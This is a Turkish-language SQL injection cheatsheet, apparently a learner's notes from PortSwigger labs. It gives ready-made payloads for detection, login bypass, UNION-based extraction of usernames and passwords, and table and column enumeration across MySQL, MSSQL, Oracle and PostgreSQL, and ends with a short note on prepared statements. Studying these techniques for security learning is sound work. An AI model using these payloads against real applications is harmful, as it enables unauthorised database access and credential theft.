# SQL Injection Cheatsheet

Kullanıcı girdisi doğrudan SQL sorgusuna eklenince sorgunun mantığını değiştirme.

## Tespit — İlk Denemeler

```
' 
" 
' OR 1=1--
' OR '1'='1
1' AND '1'='1
```
Hata veya davranış değişikliği varsa → SQLi var.

## Temel Bypass

```sql
-- WHERE filtresini atla (tüm kayıtları döndür)
' OR 1=1--

-- Login bypass (şifre kontrolünü iptal et)
username: administrator'--
password: herhangi bir şey
```

## UNION Attack — Adım Adım

```sql
-- 1) Sütun sayısını bul
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   ← hata verirse → 2 sütun
-- Kural: hata veren sayının BİR EKSİĞİ = sütun sayısı

-- 2) NULL ile doğrula
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

-- 3) String kabul eden sütunu bul
' UNION SELECT 'test',NULL--
' UNION SELECT NULL,'test'--

-- 4) Veri çek
' UNION SELECT username,password FROM users--
```

## DBMS'e Göre Farklar

| | MySQL | MSSQL | Oracle | PostgreSQL |
|---|---|---|---|---|
| Versiyon | `@@version` | `@@version` | `SELECT banner FROM v$version` | `version()` |
| Yorum | `-- -` veya `#` | `--` | `--` | `--` |
| String concat | `CONCAT()` | `+` | `\|\|` | `\|\|` |
| Dual tablosu | gereksiz | gereksiz | `FROM dual` **şart** | gereksiz |

## Oracle Özel

```sql
-- Oracle'da UNION SELECT her zaman FROM ister
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT banner,NULL FROM v$version--
```

## MySQL Özel

```sql
-- MySQL'de -- sonrası BOŞLUK şart
' UNION SELECT @@version,NULL-- -
-- ya da # kullan
' UNION SELECT @@version,NULL#
```

## Tablo ve Sütun Keşfi

```sql
-- Tablo isimlerini bul (MySQL/MSSQL/PostgreSQL)
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- Sütun isimlerini bul
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Oracle'da
' UNION SELECT table_name,NULL FROM all_tables--
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
```

## Çözdüğüm PortSwigger Labları

1. WHERE bypass: `category=Gifts' OR 1=1--`
2. Login bypass: `username → administrator'--`
3. Oracle UNION versiyon: `' UNION SELECT banner,NULL FROM v$version--`
4. MySQL/MSSQL versiyon: `Gifts' UNION SELECT @@version,NULL-- -`

## Geliştirici Savunması

```js
// YANLIŞ
query = "SELECT * FROM users WHERE id=" + userId

// DOĞRU — Prepared Statement
query = "SELECT * FROM users WHERE id=?"
stmt.execute(userId)
```

Ek: bcrypt + salt → hash sızsa bile kırılmasın (defense in depth).
